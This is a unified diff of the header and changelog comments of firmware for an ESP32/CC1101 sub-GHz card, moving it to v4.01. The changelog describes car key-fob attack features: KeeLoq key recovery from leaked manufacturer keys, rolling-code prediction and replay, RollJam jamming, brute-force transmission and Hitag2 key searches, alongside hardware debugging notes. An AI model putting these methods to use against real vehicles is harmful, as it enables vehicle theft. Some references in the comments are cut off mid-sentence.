@@ -1,6 +1,6 @@
 // ═══════════════════════════════════════════════════════════════════════════════
 // FOBworks for SGP — firmware for the SGP Card Mini
-// Version  : FOBworks for SGP v3.82
+// Version  : FOBworks for SGP v4.01
 // Board    : May 2026 stock, ESP32-S3-MINI-1-N8, 8 MB flash, no PSRAM
 // Radio    : CC1101, OOK and 2FSK, 300–928 MHz
 // Dashboard: http://192.168.4.1; per-device Wi-Fi credentials are printed over USB
@@ -23,9 +23,10 @@
 //     · 64-bit hop encrypted with 32-bit device key derived from 64-bit MFR key
 //     · 73 real manufacturer keys built-in (public leaked corpus + the public Kia
 //       V3/V4 OEM key), each with its learning type; invented filler entries removed
-//     · 10 key-derivation modes per MFR key (standard, inverted, byte-swap SN,
-//       half-key mirror, normal-learn variants, standard decrypt, XOR-type1)
-//       — 400 total combinations tried
+//     · 14 key-derivation modes per MFR key (normal-learn, xor-seed, secure,
+//       full-sn, normal-inv, byteswap-sn, half-mirror, normal-dec, magic-xor-1,
+//       magic-serial-1/2/3, rev-simple, rev-normal)
+//       — 73 × 14 = 1022 total combinations tried
 //     · Automatic device-key extraction: emits device_key_hex + add_user_key hint
 //     · KL_RECENT ring (last 5 frames) + key_probe command for offline key test
 //     · Counter delta predictor: estimates next hop code window (±65536)
@@ -124,7 +125,7 @@
 // ── KEY MANAGEMENT ────────────────────────────────────────────────────────────
 //   · 16 user-defined KeeLoq device keys stored in NVS (survives power cycle)
 //   · add_user_key / del_user_key / key_list / key_clear serial commands
-//   · key_recover: exhaustive 40-key × 10-mode device-key search across captures
+//   · key_recover: exhaustive 73-key × 14-mode device-key search across captures
 //   · key_probe: test any candidate key against last 5 captured frames instantly
 //     (no re-capture needed); returns confidence level + save_hint JSON
 //
@@ -169,7 +170,7 @@
 //   · Group-level merge analyzer — 5-minute background scan identifies captures
 //       from the same physical fob decoded inconsistently; one-click MERGE ALL
 //       using union-find transitive merging; merge cards dismissible per-pair
-//   · KeeLoq Key Recovery — exhaustive 40-key × 10-mode device-key search;
+//   · KeeLoq Key Recovery — exhaustive 73-key × 14-mode device-key search;
 //       recovered key shown with confidence, auto-save to NVS via add_user_key
 //   · Replay controls — replay last, replay predicted next, replay range,
 //       dual-series A/B replay for compare captures; live replay state overlay
@@ -193,6 +194,335 @@
 //     (raw_bits and predicted_next stripped to stay within quota; cap 300 signals)
 //
   // ── CHANGELOG ─────────────────────────────────────────────────────────────────
+  // v4.01 (2026-10-06) — Kia V1 was silent on hardware even though it decoded in the
+  //   host harness. The import path proved the frame reaches the card unchanged
+  //   (te_us=807, ratio 1.99 — the exact 800/1600 the reference specifies), yet the
+  //   card reported proto=KeeLoq sn=0xFFFF btn=0xF ctr=0xFFFF. That is the KeeLoq
+  //   failure sentinel, not a decode: the loose KeeLoq gate (te_kl_loose, cA 70-1000
+  //   / ratio 1.3-2.9) claimed the V1 frame and committed before the KIA-V1 branch
+  //   180 lines further down could run. The V1 preamble predicate now excludes the
+  //   frame from the loose gate, so it reaches its own branch; if that parse ever
+  //   fails the public-OEM-key KeeLoq block downstream still covers it. Verified on
+  //   the physical card: sn=0xB444706E btn=1 ctr=0x091, and the Estima near-miss
+  //   controls still refuse KIA-V1 (they have no 140+ pulse 1600µs preamble).
+  //
+  // v4.00 (2026-10-05) — GDO0 probe: is the CC1101's GDO0 really unrouted, or just
+  //   masked? A vendor-archive and online review (plus this board's own diagnostics)
+  //   settled the hardware question and forced one new experiment.
+  //
+  //   [FINDING] The vendor sources are PCB V2 and they disagree by revision:
+  //   the 2026-05-25 corrected header (esquema v3.6, Rajj JLCPCB-002) says "CC1101
+  //   GDO0/GDO2 no cableados al ESP32" and "LoRa SX1262 DIO1=48", and the same file
+  //   sets PIN_CC1101_GDO0 to -1 with the comment "Antes era 48, pero 48 es DIO0 del
+  //   LoRa". The V1-era Apr 2026 sketches (HACKER1) declared GDO0=48 and expected an
+  //   SX1278. This board reports LoRa RegVersion 0x12 (SX1278), so it is the SX1278
+  //   generation the V2 note describes, and pin 48 is the LoRa's DIO.
+  //
+  //   [CAVEAT] Every earlier probe ran with the LoRa merely asleep or reset, and
+  //   gdo0_isolate tri-states the CC1101 when it would need to drive. Two outputs on
+  //   one net behave like open-drain, so a LoRa holding the line LOW can MASK a
+  //   CC1101 driving it. "Sunk with the CC1101 tri-stated" therefore does not by
+  //   itself prove GDO0 is unrouted. clock_edges=0 in the clock test looked decisive
+  //   but that test also ran with DIO0 live.
+  //
+  //   [FIX] New command {"cmd":"gdo0_signal"}: with the sensor rail cut so the SX1278
+  //   is fully unpowered, configure the CC1101 GDO0 to CLK_XOSC/192 (IOCFG0=0x3F,
+  //   SRX) and count edges on pin 48. A nonzero count means GDO0 IS wired and the
+  //   SX1278 was masking it — which would unblock async TX by powering the LoRa down
+  //   during a capture. Zero edges means it is genuinely not routed. This is the one
+  //   test the prior probes could not run; it observes only the clock, transmits
+  //   nothing, and restores the rail and IOCFG0 before returning.
+  //
+  // v3.99 (2026-10-05) — Renault V1 Layer 2 closed: the epoch/seed model is wrong.
+  // shipped the Layer-1 wire decoder and left key
+  //   recovery open with the ProtoPirate 2^18 epoch search characterised as a miss.
+  //   This closes it. In the classic model the whole cipher state is derived from
+  //   the serial (which the frame carries in the clear) and the only unknown is the
+  //   32-bit IV, so the space can be exhausted outright: tools/renault_hitag2_
+  //   fullsearch.py sweeps all 2^32 IVs per frame. All five real frames return
+  //   exactly one IV each — the chance fixed-point count (2^32/2^32 = 1) — and the
+  //   seed byte iv[3], which a real fob would hold constant, reads 1A/31/58/D5/72.
+  //   They are collisions with the hop, not the IV. So the epoch/seed model does
+  //   not describe a Renault V1 remote; widening the search was never going to
+  //   work. The standing hypothesis is the keyed FIAT-V1 BCM cipher the reference
+  //   already suspected, and the 8-key dictionary returns zero hits (a 2011 key is
+  //   private) — recovery needs extraction, not a bigger search. Firmware is
+  //   unchanged; the Layer-1 decoder still ships structural-only. The on-air leg is
+  //   blocked on this board's unrouted GDO0 (RSSI edge mode collapses the frame),
+  // New tools: renault_hopseq, renault_hitag2_fullsearch,
+  //   renault_fiat_keytest, renault_onair; test_renault_layer2.py.
+  //
+  // v3.98 (2026-10-05) — Renault V1 (Hitag2) Layer-1 decoder.
+  //   The last big European corpus hole after FIAT V1: 22 Renault captures with no
+  //   decoder, and the only remaining European make on a stream cipher rather than
+  //   a KeeLoq-family NLFSR. Ports the ProtoPirate feed state machine — the
+  //   two-level sync (1500µs low / 1000µs high) and a 125µs 104-bit Manchester
+  //   frame (16 header + 64 key + 24 key2), validity = inverted header == 0x0001
+  //   AND the 11-byte XOR. Polarity-proof through the Flipper 4-state machine.
+  //   Verified two ways: a synthetic known frame round-trips, and the near-miss
+  //   Renault families reject. Decodes the corpus's one genuine Hitag2 recording
+  //   (Trafic 2011 open, sn 3270FD2B btn 2 ctr 0x15C, counter walking across
+  //   repeats). Layer-2 key/epoch recovery is deliberately NOT shipped: the
+  //   ProtoPirate 2^18 epoch search does not converge on this capture even at
+  //   2^26, so the decoder reports structural fields only. Two follow-ups are
+  // — the epoch derivation for this generation, and a
+  //   capture-arming fix (the first Hitag2 sync sits at pulse 1887, past CAP_SZ).
+  //
+  // v3.97 (2026-10-05) — FIAT V1 decoder, the first on-brand European corpus win.
+  // §2.6 ranked FIAT (12 captures) among the highest-value missing
+  //   decoders. Three ProtoPirate FIAT references were swept against the corpus:
+  //   V0 (no FIAT reference exists) and V2 (fires only on Chrysler, 0/12 on-brand)
+  //   are dead ends, but V1 fires on 8 of the 12 FIAT captures with zero
+  //   cross-brand false positives across all 306 files. It is a 104-bit Manchester
+  //   frame split over two TE variants (A 250/500µs, B 100/200µs); a rolling
+  //   208-cell window is tested both non-inverted and inverted, and a frame is
+  //   accepted only when raw[0]=0x00, raw[1]=0x01, the 12-byte XOR checksum
+  //   matches raw[12] and the button nibble is one of 1/2/4/8. That triple gate is
+  //   what keeps it silent on every other brand. Decodes confirm: Grande Punto
+  //   uid B6AB9928 with btn 1=Close / 2=Open and sequential counters, Panda
+  //   uid A4A02529 btn 2. Fields serial/btn/ctr/hop feed the history and
+  //   predict path; the intra-capture repeat vote runs via ks_consFiatV1.
+  //   Closes one of the two biggest European holes from the corpus triage.
+  //
+
+
+  // v3.96 (2026-10-05) — the FSK capture path says what it is.
+  // both parked the FSK question because the bench had no
+  //   2-FSK transmitter. The Flipper now provides one (a 2FSKDev238 RAW replay).
+  //   Measured: a 2-FSK burst holds the RSSI envelope flat (first 64 samples
+  //   identical at -47 dBm, 9 runs in 2 s), because AGCCTRL2 RSSI is an AMPLITUDE
+  //   estimate and FSK carries its data in frequency. The same file path in OOK
+  //   gave 2436 runs. So an FSK capture's near-empty buffer is not noise, and the
+  //   old "Too few edges — likely noise" mislabelled it. That branch now reports
+  //   reason fsk-const-envelope and names the missing GDO0, when fskCapMode is set
+  //   AND the trigger fired. OOK and genuine-noise paths are unchanged.
+  // v3.95 (2026-10-05) — BLE made lazy: the card's control surface comes back
+  // Measured boot heap profile on this board with core 3.3.12:
+  //   idle 160,856 → after Wi-Fi 94,148 → after DNS 89,088 → after BLE 17,720 →
+  //   after HTTP 3,748 → after WS 3,748 → after SD 1,276 (largest chunk 1,012).
+  //   BLE alone took ~71 KB, and the ~1 KB that survived could not hold a
+  //   deserializeJson, so every serial and WebSocket command failed
+  //   bad-json/NoMemory — the whole control surface was deaf while the radio
+  //   still scanned. BLE scan/pair/N11 are auxiliary; nothing on the RF
+  //   capture/decode/transmit path needs them. BLEDevice::init() moved out of
+  //   setup() into bleStart(), called on the first BLE route hit. Idle heap is
+  //   now 62,188 B (largest chunk 31,732) and status answers immediately. Boot
+  //   heap probes (HEAP_PROBE) stay in setup() as the regression witness.
+  // v3.94 (2026-10-05) — §2.7: the brute routes stop blocking.
+  //   /api/resync_probe (<=64 codes x 30 ms) and /api/fixed_bruteforce (<=1024 x
+  //   20 ms) ran their whole transmit loop inside the WebServer callback — at the
+  //   maximum, fixed_bruteforce held the loop ~20 s, stalling status polling and
+  //   dropping the browser request. Both are now tick-driven sequencers
+  //   (resyncArm/fixedBruteArm/bruteTick), the same shape rbTick()/rjTick() use:
+  //   one transmit per loop() pass, a bounded inter-frame delay, a brute_progress
+  //   event every 50 frames, and a done event. Single-flight — a second arm while
+  //   one runs is refused with brute-busy. New /api/brute_status and serial
+  //   {"cmd":"brute_status"}. The routes now reply immediately with queued:true.
+  // v3.93 (2026-10-05) — N14: hop-XOR telemetry.
+  //   Every KeeLoq field but the hop word is plaintext, and the hop is an
+  //   invertible block cipher over the counter. Two presses of the same button
+  //   therefore differ only in the counter, so hopA^hopB = E(ptA)^E(ptB) is a
+  //   key-independent observable. This release surfaces it three ways: the
+  //   serial command {"cmd":"hop_xor"}, the /api/hop_xor route, and a per-decode
+  //   hop_xor object on every KeeLoq frame after the first; plus a 32-cell flip
+  //   strip on the dashboard. No manufacturer key is needed and nothing is
+  // assumed about word order. See for what the strip does and does
+  //   not prove.
+  // v3.92 (2026-10-05) — N16: serial dispatcher fuzz suite + the unknown-cmd tail
+  // A typo'd command with a valid token was
+  //   silent — indistinguishable from a dropped line. The dispatcher now replies
+  //   {"ok":false,"error":"unknown-cmd","cmd":...} with the cmd echoed, escaped,
+  //   printable-only, and capped at 40 chars.
+  //   FIX in the same release: the LED bring-up moved BEFORE WiFi/BLE. On the
+  //   reinstalled toolchain the WiFi/BLE stack leaves <600 B of heap by the old
+  //   LED-init point, and espShow()'s first RMT alloc (mutex + channel) aborts
+  //   in lock_init_generic — a boot crash loop at setLed(0,0,255). Measured:
+  //   free=580/max=436 at the old position. Allocating RMT early (heap ~150 KB
+  //   free) fixes it; later setLed() calls only write pixels. Also: setLed() no
+  //   longer re-begins the strip after beep() (the second RMT alloc would abort).
+  // v3.91 (2026-10-04) — N17: AGC filter-length knob for captures.
+  //
+  // [WHY] measured the capture path's real ceiling: ~1/8 of a Kia
+  //   frame's pulses resolve in RSSI mode, because the stock AGCCTRL0
+  //   FILTER_LENGTH=16 average holds ~150 µs of memory and smears sub-150 µs OOK
+  //   lows against their highs into a plateau.
+  //
+  //   [ADD] {"cmd":"agc","filter":8|16|32|64} rewrites AGCCTRL0 at capture setup —
+  //   the same register block that clears the latched front-end state, so every
+  //   capture path applies it. 8 halves the averaging for faster envelope tracking
+  //   at a noisier floor; 16 is the default and today's behavior exactly. GDO0
+  // routing (the other candidate) is a board mod, not firmware.
+  //
+  // v3.90 (2026-10-04) — N16: frame-gap arming for the capture path.
+  //
+  // [WHY] 's leg-2 failures were "signal always seen, edges sometimes 0":
+  //   the signal wait arms the edge buffer on FIRST ENERGY, and a RAW playback's
+  //   leading carrier parks the AGC on a plateau that fills the 512-slot buffer with
+  //   threshold-crossing noise before any frame boundary arrives (raw=512/512,
+  //   BUFFER_FULL, after75=3..13).
+  //
+  //   [FIX] Gap mode holds the buffer unarmed past first energy until the carrier
+  //   shows a quiet run ≥ gapArmQuietUs at ≤ edgeThr − gapArmQuietBelowDb — below
+  //   the plateau, because the plateau itself rides AT edgeThr (bench: plateau
+  //   -74..-77, edgeThr -76, floor -95). Armed, the recorder starts on the NEXT
+  //   energy onset: a frame edge. A per-pass budget bounds the wait; at expiry
+  //   on a live carrier the pass retries up to gapArmRetries times, then falls
+  //   back to the legacy record path so a capture is never lost to the arming.
+  //   Off by default; {"cmd":"capture","arm":"gap"} per capture or {"cmd":"gaparm","on":true}
+  //   globally, HTTP ?arm=gap on /api/capture_start. Verified on the bench by self-
+  //   loopback (card TX → card RX): armed captures start at a frame boundary, and
+  //   the fob-press shape (energy = preamble) rides the budget-expiry fallback with
+  //   no loss. The AGC edge-resolution ceiling (~1/8 of pulses) is unchanged and
+  // remains the capture path's real limit —
+  //
+  // v3.89 (2026-10-03) — boot-heap fix: the first v3.88 flash crashed at boot.
+  //
+  //   [BUG] v3.88 crashed in setup() at Wire.begin — lock_init abort, heap exhausted
+  //     before I2C could allocate its mutex. Statics had grown to 163,604 B; the idle
+  // heap floor was already 2-3 KB on v3.86, and the arc's
+  //     2.7 KB of new BSS (plus the PSA arc's earlier +6.4 KB) pushed it under.
+  //
+  //   [FIX] Right-sized three buffers: N13_KEY_RING 64→16 (-1,344 B), N11_MAX_MACS
+  //     24→16 (-192 B), BleEntry.uuids 200→64 (-2,720 B across 20 entries; one service
+  //     UUID is 37 chars max). Statics now 159,348 B — lower than v3.87's 160,908 —
+  //     and the idle heap reads 3,172 B free / 1,908 B max-alloc, the same health as
+  // 's v3.86 baseline.
+  //
+  //   [ADD] Serial commands n11_arm/n11_status/n11_disarm/n12_status/n13_fp/n13_clear,
+  //     twins of the HTTP routes, so the bench drives the arc over USB with no browser.
+  //     serialEmitNoNl() added for the table dumps that assemble one JSON reply.
+  //
+  // v3.88 (2026-10-03) — research arc N11/N12/N13: the card becomes a presence monitor.
+  //
+  //   [N11] Press-correlation pairing (/api/n11_arm, /api/n11_status, /api/n11_disarm):
+  //     while armed, every UHF capture and every BLE advertisement inside a window is
+  //     recorded; per-MAC hits/misses fold at window close. A MAC seen in >=3 windows,
+  //     all with the fob firing, is the fob's own BLE identity — derived, not negotiated.
+  //     Links the RKE serial to a trackable BLE address with hardware already on the card.
+  //
+  //   [N12] RollJam detector (n12MarkTx on jam start/stop, n12OnCapture on every kept
+  //     decode, /api/n12_status): the defensive inversion of the card's own C1 attack.
+  //     A capture landing at our TX frequency outside the 1.2 s own-echo window is a
+  //     suspect co-channel transmission — an attacker's capture or replay radio. 16-event
+  //     ring, 60 s retention.
+  //
+  //   [N13] Timing-fingerprint classifier: every capture quantizes onto (freq 0.2 MHz,
+  //     TE log2, ratio 0.25, bits log2) and histograms into NVS namespace n13fp.
+  //     fp_first_seen flags a bucket's first capture; fp_pop counts its population.
+  //     Same-bucket/different-sn across captures is the clone-or-second-fob signal.
+  //     The frequency axis uses two scales (sub-400 kHz-side, >=400 0.2 MHz-side)
+  //     because the one-scale masked form collided cross-band — caught by
+  //     test_n11_n12_n13.py before shipping. /api/n13_fp dumps the mirror ring,
+  //     /api/n13_clear wipes both stores.
+  //
+  // v3.86 (2026-10-02) — chunked serial import: large bodies no longer need one big String.
+  //
+  //   [BUG] fbk_import over serial stopped replying above ~130 pulses. Root cause measured on
+  //     the card: idle heap is ~2-3 KB with WiFi/BLE/HTTP/WS live, and the one-shot form
+  //     holds the whole CSV in a String while deserializeJson allocates the document beside it,
+  //     so one contiguous block of roughly 2x the line size is needed. A 586-byte line replies;
+  //     a 601-byte line fails with NoMemory. A full 512-pulse window is ~2 KB, so the one-shot
+  // form could never carry it. suspected heap and could not prove it; the
+  //     bad-json/NoMemory reply plus the heap figures in it are the proof.
+  //
+  //   [FIX] fbk_pulses_begin / fbk_pulses_add / fbk_pulses_end stage a body into impStage in
+  //     slices of up to 48 pulses, then run the same fbkImportFrame() over the assembled body.
+  //     Each line stays ~240 bytes, half the measured NoMemory boundary (~600 B), so the
+  // add path rides the heap with margin rather than on it. The slice
+  //     size is a documentation bound — the handler accepts more if sent — but the bench
+  //     helper and README both send 48. An add that carries a pulses field yet stages
+  //     nothing now replies ok:false with reason empty-pulses, so a heap-starved parse is
+  //     visible to the sender instead of silent. fbk_import is unchanged and still works
+  //     for small bodies.
+  //
+  // v3.85 (2026-10-01) — the band tilt is configuration-dependent and not the LoRa module.
+  //
+  //   [DIAG] Added lora_power_floor, agc_tilt and frend0_tilt. Each measures the noise floor
+  //     with one variable changed, so a hypothesis gets an answer instead of an inference.
+  //
+  //   [FINDING] The band-1/band-2 elevation is not a latch and not the SX1278.
+  //
+  //     · lora_power_floor measures the same frequency with the module awake, held in reset,
+  //       parked, and unpowered. All four read within 1 dB of each other at 360, 440, 433.92,
+  //       315 and 868. The module is not what is being received. This disproves the hypothesis
+  //       that the rail-cycle diagnostics raise the floor by leaving the LoRa awake.
+  //
+  //     · The elevation is present immediately after a fresh boot and does not drift over
+  //       20 s, so it is the default operating state rather than a transient latch.
+  //
+  //     · It is configuration-dependent. With the registers at power-on-reset values the board
+  //       reads flat — 4 dB between 315 and 868, the same as a Flipper Zero in this room. With
+  //       the configuration cc_init() writes it reads 22 dB tilted.
+  //
+  //     · The tilt is not reachable from the front-end registers. All eight MAGN_TARGET values
+  //       give 13-19 dB, three FREND1 settings give 14-15 dB, and all eight FREND0 PA_POWER
+  //       values give 13-16 dB. The remaining candidate is the RF matching network, which is
+  //       hardware and out of reach of firmware.
+  //
+  //     Practical effect: the tilt does not break captures on its own, because the trigger is
+  //     derived from the floor actually measured. It costs margin — floor -76 gives a trigger
+  //     at -66 against fobs near -64, about 2 dB. The hard failure was the latch, and v3.84
+  // clears that. See
+  //
+  //   Compile: 1,781,188 B flash (56%), 149,764 B RAM (45%). All suites pass.
+  //
+  // v3.84 (2026-10-01) — a latched front-end state, found by inducing and clearing it.
+  //
+  //   [BUG] The card would sit with a ~35 dB elevation across roughly 310-370 MHz while
+  //     reading normally everywhere else. At 315 the floor held at -66/-67 dBm against a
+  //     true floor near -101/-110, and 433.92 stayed clean throughout (1 dB spread over
+  //     150 windows), so this was never a broad low-band problem. The elevation was also
+  //     bimodal within a window: 143 of 150 samples parked at -66, 6 dropping to -110.
+  //
+  //     Because captureSignal() sets trigThr = floor + 10, a floor of -66 put the trigger
+  //     at -56 and a real fob at -64 could not cross it. That is the 315 MHz capture
+  //     failure, and it was a threshold derived from a bad floor rather than a bad
+  //     threshold.
+  //
+  //     [CAUSE] Cycling the 3.3 V sensor rail. PIN_SENSOR_CE (GPIO6) powers the CC1101 as
+  //     well as the SX1278 — gdo0_rail_test confirms the CC1101 stops answering with the
+  //     rail down — so any rail cycle disturbs the radio. lora_sleep_check() and
+  //     gdo0_rail_test() both cycle it, and both were measured to induce the state, three
+  //     for three.
+  //
+  //     [CLEAR] Rewriting MDMCFG2/DEVIATN. Determined by inducing the state and then
+  //     trying single handlers: rssi_path_check (freq + SIDLE/SRX) and gdo0_probe (IOCFG0)
+  //     both left it at -67, while cap_mode and rx_floor_check (both rewrite 0x12/0x15)
+  //     cleared it to -101/-103.
+  //
+  //     [FIX] captureSignal() now writes MDMCFG2/DEVIATN unconditionally before the FIFO
+  //     flush, instead of only on the 2FSK path. An earlier round of this investigation
+  //     reached the opposite conclusion — that a rail cycle *cleared* the elevation — by
+  // reading two back-to-back events in the wrong order. Recorded
+  //
+  //   Compile: all suites pass.
+  //
+  // v3.83 (2026-09-30) — the diagnostics no longer change the state they measure, and
+  // lora_sleep_check reports the chip again.
+  //
+  //   [BUG] v3.82 parked the SX1278 with RST held LOW in setup(), which is the right state
+  //     for RF work. But lora_sleep_check reads RegOpMode and RegVersion over SPI, and a
+  //     chip in reset does not answer SPI. It was therefore reading 0x00 from every
+  //     register and reporting verdict SPI_READ_DEAD -- a false alarm about the hardware.
+  //     Its own guard caught it (the RegVersion control read 0x00 instead of 0x12) rather
+  //     than reporting sleep_landed:true on dead reads, which is the useful part: the
+  //     instrument rejected its own measurement.
+  //
+  //     Fixed by releasing RST for the read and re-parking afterwards. Verified on the
+  //     card: version_reg=12, spi_live=true, sleep_landed=true, LORA_CONTENTION_CONFIRMED.
+  //
+  //   [DIAG] Five diagnostics left the module un-parked, because loraHardReset() ends by
+  //     driving RST HIGH and only setup()/captureSignal() re-parked it. gdo0_probe,
+  //     lora_sleep_check, gdo0_isolate, gdo0_rail_test and lora_rst_check now park on exit,
+  //     so a diagnostic no longer changes the state the next capture runs in.
+  //
+  //     Measured before and after at 700 MHz: -109 un-parked against -109 parked, i.e. no
+  //     detectable floor difference in this condition. This is a consistency fix, not a
+  //     noise fix, and it is recorded as that rather than claimed as more.
+  //
+  //   Compile: 1,775,164 B flash of 3,145,728 (56%), 149,764 B RAM of 327,680 (45%).
+  //   All 18 suites pass.
+  //
   // v3.82 (2026-09-30) — hold the LoRa module in reset, which stops the false captures.
   //
   //   [BUG] The card fired captures with NOTHING transmitting, at bands no consumer device
@@ -223,7 +553,7 @@
   //     busiest ISM band, so it is recorded as probably environmental rather than a defect.
   //     Whether the card should capture on ambient RF at all is open as a design question.
   //
-  //   research/55 records the measurements. This also explains research/49's headline: what
+  // records the measurements. This also explains 's headline: what
   //   "worked" at 433.92 included ambient and LoRa noise, so that comparison was never
   //   measuring the capture path.
   //
@@ -231,9 +561,9 @@
   //   All 18 suites pass.
   //
   // v3.81 (2026-09-30) — the FSK noise floor is an AGC target, not a dead radio.
-  // See research/48.
+  // See
   //
-  //   [FINDING] research/47 left the FSK floor reading ~15 dB below the OOK one
+  // [FINDING] left the FSK floor reading ~15 dB below the OOK one
   //     (-100 vs -86 dBm), and a -100 dBm reading is what a CC1101 returns when it
   //     is not receiving. That mattered because captureSignal() derives its trigger
   //     from it (trigThr = floor + 10).
@@ -262,12 +592,12 @@
   //
   //     A fourth phase reading the floor in IDLE was tried and removed: RSSI is not
   //     maintained in IDLE, so it returns a stale register and the samples jumped
-  //     between -86 and -99 across runs. Recorded in research/48 §4 rather than left in.
+  // between -86 and -99 across runs. Recorded §4 rather than left in.
   //
   //   Compile: 1,771,164 B flash, 149,764 B RAM. All 18 suites pass.
   //
   // v3.80 (2026-09-30) — the noise-floor diagnostics were measuring the sweep, not
-  // the radio. See research/47.
+  // the radio. See
   //
   //   [BUG] rx_floor_check and rssi_path_check gave a different answer on every run,
   //     including two different verdicts from the same command. Three runs with the
@@ -300,7 +630,7 @@
   //
   //     The /api/* twins of several of these are still unguarded. Not changed here:
   //     the serial paths are what the bench exercises and what the host suite covers,
-  //     and the HTTP change has no bench evidence yet. Recorded in research/47 §3.
+  // and the HTTP change has no bench evidence yet. Recorded §3.
   //
   //   Compile: 1,770,476 B flash, 149,764 B RAM. All 18 suites pass.
   //
@@ -310,7 +640,7 @@
 //     format captures could ever be imported. rjTrimKiaV34 looks for the 162-pulse Kia
 //     repeat by construction, so a Toyota, CAME, Nice or Ford body can never satisfy it --
 //     the import path was therefore narrower than the docs implied, and it blocked loading
-//     the one family the bench actually needs (research/43).
+// the one family the bench actually needs.
 //
 //     fbkAppend already keeps the raw block when the trim finds nothing ("a wrong trim is
 //     worse than a long one, because the decoder can still find a frame inside a
@@ -348,7 +678,7 @@
 //
 //   [NOT FIXED] The data stage still resolves only 2 of the 62 captures, and emits several
 //     inconsistent frames per capture. That needs a correctly-scaled capture; the corpus
-//     scaling is unreliable (research/38). Also noted for later: the entropy gate accepts up
+// scaling is unreliable. Also noted for later: the entropy gate accepts up
 //     to 32 transitions in 39 bit-pairs, and 82% is close to alternating noise, so its upper
 //     bound can be tightened well below 32 with no risk to real frames.
 //
@@ -378,12 +708,12 @@
 //     than just above the observed value, so no real frame can reach it.
 //
 //   Neither fix narrows a pulse-geometry tolerance, so neither depends on capture scaling,
-//   which matters because the corpus scaling is unreliable (research/38).
+// which matters because the corpus scaling is unreliable.
 //
-//   [FIX] The band remark in research/37 §4.1 is a red herring: te_kv2 requires eu433, so
+// [FIX] The band remark §4.1 is a red herring: te_kv2 requires eu433, so
 //     433.92 MHz is the correct band for the EU V2 variant and the band gate was working.
 //
-//   [DOC] research/39 records the investigation; research/36 §3.3 and research/37 §6 carry
+// [DOC] records the investigation; §3.3 §6 carry
 //     corrections, because both described these as "too-permissive validation" when the
 //     KiaV2 cause was an incorrect check rather than an absent one.
 //
@@ -524,7 +854,7 @@
 //     gdo0_rail_test, tx_fifo_test, tx_carrier_test, pa_check, and jam_status. Readbacks
 //     and reference-pin checks make each result easier to verify.
 //
-// v3.71 (2026-09-26) — a capture is now trimmed to ONE frame (research/11 F2/F5/F4).
+// v3.71 (2026-09-26) — a capture is now trimmed to ONE frame.
 //
 //   [BUG] A capture buffer entry was several repeats of one code, not one code.
 //     captureSignal fills CAP_SZ=512 pulses and a press emits its frame repeatedly,
@@ -577,11 +907,11 @@
 //
 //     1. The jam was owned by the browser. Closing the tab or losing Wi-Fi
 //        mid-sequence left the carrier running with nothing to stop it — the same
-//        class of failure as the reset-path jam (research/09 §2.2), one layer up.
+// class of failure as the reset-path jam , one layer up.
 //     2. No deadline and no single-shot lockout. The JS re-armed itself on replay,
 //        so a duplicate tap could re-fire.
 //     3. No check that the two banked "codes" were two different codes — the defect
-//        research/10 §2.5 fixed in C2, present here too.
+// §2.5 fixed in C2, present here too.
 //
 //   [C1] rjState machine: IDLE -> JAM1 -> CAP1 -> JAM2 -> CAP2 -> TX1 -> IDLE.
 //     · rjArm() is explicit and refuses while a sequence runs; rjStart() consumes
@@ -600,12 +930,12 @@
 //   [PREREQ] captureSignal() takes an optional gapUs. The 350 ms default allows a
 //     Toyota preamble-to-data silence to pass; C1 passes RJ_CAP_GAP_US (8 ms) so the
 //     capture ends at the frame repeat boundary and one block is ONE code, not
-//     several repeats of it (research/10 §3).
+// several repeats of it.
 //
 //   Surfaces: /api/rolljam_arm | _start | _abort | _status | _replay, serial
 //   mirrors, all behind the auth gate.
 //
-//   [NOT DONE] C1 still needs bench validation, and research/04 C1 names the thing
+// [NOT DONE] C1 still needs bench validation, C1 names the thing
 //     to validate: dropping the jam for a capture window also lets the CAR hear that
 //     press. This code does the "jam through the press, RX between presses" ordering;
 //     whether that ordering works against a real receiver is not something a host
@@ -616,7 +946,7 @@
 //     path, same-code refusal, deadline, single-shot, re-armability after success, and
 //     that the replay sends press 1. 9/9 mutants caught.
 //
-// v3.69 (2026-09-26) — C2 refuses a same-code pair (research/10 §2.5).
+// v3.69 (2026-09-26) — C2 refuses a same-code pair.
 //
 //   [BUG] rbArm required two ENTRIES but not two different CODES.
 //     One fob press can append two entries: captureSignal fills CAP_SZ=512 pulses
@@ -643,7 +973,7 @@
 //     no-distinct-codes) plus a hint, so a refusal is diagnosable rather than silent.
 //
 //   [NOT DONE, deliberately] Trimming each stored block to one frame before
-//     transmitting. research/10 §2.5 asks for it on the premise that a 512-pulse
+// transmitting. §2.5 asks for it on the premise that a 512-pulse
 //     block "will look to the receiver like three presses". Measurement contradicts
 //     that: the ~3 frames in a capture all carry the SAME counter, i.e. they are the
 //     repeats a real fob sends for one press. Trimming would remove repeats the
@@ -659,7 +989,7 @@
 //
 // v3.68 (2026-09-26) — reset-path jam guard, executable C2 test, honest A2.
 //
-//   [CRITICAL] Reset-path jam guard (research/09 §2.2, §5.4).
+// [CRITICAL] Reset-path jam guard.
 //     A reset (watchdog, brownout, panic, reflash) runs no cleanup path, so a jam
 //     active when the CPU died could outlive it. Mechanism: startJam() leaves the
 //     CC1101 in TX (STX) and drives GDO0 HIGH; in async TX GDO0 is the TX DATA
@@ -787,7 +1117,7 @@
 //     A1 now builds the true on-air format (preamble, sync with the level set by
 //     version, one bit per pulse) via ks_kiaV34BuildPulses.
 //
-//   Evidence (research/08 section 7, tools under research/sources/):
+// Evidence:
 //     · corpus fetched: 323 captures in research/sources/corpus_automotive_subghz/
 //     · the firmware C decoder and the Python mirror agree exactly on real captures
 //     · KIA V3 N1 -> V3 sn=0x00C0ED06 ctr=0x0026  (was reported V4 before the fix)
@@ -818,7 +1148,7 @@
 //     encryption input are different layouts in this protocol:
 //       on-air  (serial & 0x0FFFFFFF) | (btn<<28)
 //       encrypt (cnt & 0xFFFF) | ((serial & 0x3FF)<<16) | (btn<<28)
-//     Only serial[9:0] enters the encrypted word. research/06 §2.6 conflated
+// Only serial[9:0] enters the encrypted word. §2.6 conflated
 //     them; the on-air form loses the top serial bits into bits[43:16] of a
 //     32-bit word and overwrites the button nibble, so any serial >= 0x3FF
 //     failed validation. Caught by the A1 round-trip at serial 0x0A1B2CE7.
@@ -851,7 +1181,7 @@
 //     "serial & 0xFF" would have passed every test. Vector 2 uses
 //     serial=0x0A1B2FE7 (serial[9:8]=11) to pin the mask width. Both computed
 //     from lib/subghz/protocols/kia_v3_v4.c:243 and verified with the shipped
-//     cipher. Note: research/07 §2 and §3.2 contain two errors, documented and
